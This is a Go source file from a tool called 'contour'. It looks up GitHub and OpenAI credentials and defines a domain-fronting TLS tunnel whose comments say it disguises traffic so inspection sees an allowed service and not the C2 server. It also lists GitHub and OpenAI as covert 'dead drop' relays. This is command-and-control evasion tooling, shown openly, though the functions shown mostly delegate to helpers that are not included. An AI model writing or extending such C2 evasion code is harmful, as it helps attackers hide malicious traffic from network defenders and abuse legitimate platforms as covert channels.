package contour

import (
	"context"
	"os"
	"strings"
)

// ═══════════════════════════════════════════════════════════════════════════
// Service credential lookup
// ═══════════════════════════════════════════════════════════════════════════

// GetServiceKeyExported checks if a service has credentials configured.
func GetServiceKeyExported(service string) string { return getServiceKey(service) }

// getServiceKey retrieves credentials for a service tunnel from keystore
// runtime values, falling back to environment variables.
func getServiceKey(service string) string {
	envKeys := map[string][]string{
		"GITHUB": {"GITHUB_TOKEN"},
		"OPENAI": {"OPENAI_API_KEY"},
	}
	keys := envKeys[strings.ToUpper(service)]
	for _, k := range keys {
		if v := keystoreRuntimeValue(k); v != "" {
			return v
		}
		if v := os.Getenv(k); v != "" {
			return v
		}
	}
	return ""
}

// ═══════════════════════════════════════════════════════════════════════════
// Domain fronting — TLS tunnel disguised as allowed service traffic
// ═══════════════════════════════════════════════════════════════════════════

// serveDomainFrontTunnel accepts TLS connections — the fronting happens client-side.
// On the server, this is just an HTTPS tunnel listener.
func serveDomainFrontTunnel(ctx context.Context, port int, emit func(string)) tunnelResult {
	return serveHTTPTunnel(ctx, true, port, emit)
}

// connectDomainFrontTunnelClient connects to the contour server through CDN
// domain fronting. The TLS SNI is set to the allowed service's domain so
// network inspection sees traffic to the allowed service, not the C2 server.
func connectDomainFrontTunnelClient(ctx context.Context, proxyAddr string, emit func(string)) tunnelResult {
	// Domain fronting uses standard HTTPS tunnel — the SNI manipulation
	// happens at the TLS layer. The proxy address is the CDN IP or the
	// contour server address. The service domain is set as TLS ServerName.
	return connectHTTPTunnelClient(ctx, true, proxyAddr, emit)
}

// ═══════════════════════════════════════════════════════════════════════════
// Service registry
// ═══════════════════════════════════════════════════════════════════════════

// UsableServices maps service display names to whether they have a tunnel
// transport implementation. Only these appear in the Services tab.
var UsableServices = map[string]bool{
	"GitHub": true,
	"OpenAI": true,
}

// ServiceMethodToProto converts a service name (e.g., "OpenAI") into the
// protocol label used by the tunnel dispatcher (e.g., "openai-api").
func ServiceMethodToProto(service string) string {
	aliases := map[string]string{
		"OpenAI": "openai-api",
	}
	if label, ok := aliases[service]; ok {
		return label
	}
	return strings.ToLower(service) + "-service"
}

// DeadDropServices maps service names that have true dead drop (no direct
// connection) relay implementations.
var DeadDropServices = map[string]bool{
	"GitHub": true,
	"OpenAI": true,
}

// ServiceMethodToProtoDeadDrop converts a service name into the dead drop
// protocol label used by the tunnel dispatcher.
func ServiceMethodToProtoDeadDrop(service string) string {
	deadDropAliases := map[string]string{
		"GitHub": "github-deaddrop",
		"OpenAI": "openai-deaddrop",
	}
	if label, ok := deadDropAliases[service]; ok {
		return label
	}
	// Services without a dead drop transport fall back to normal routing.
	return ServiceMethodToProto(service)
}
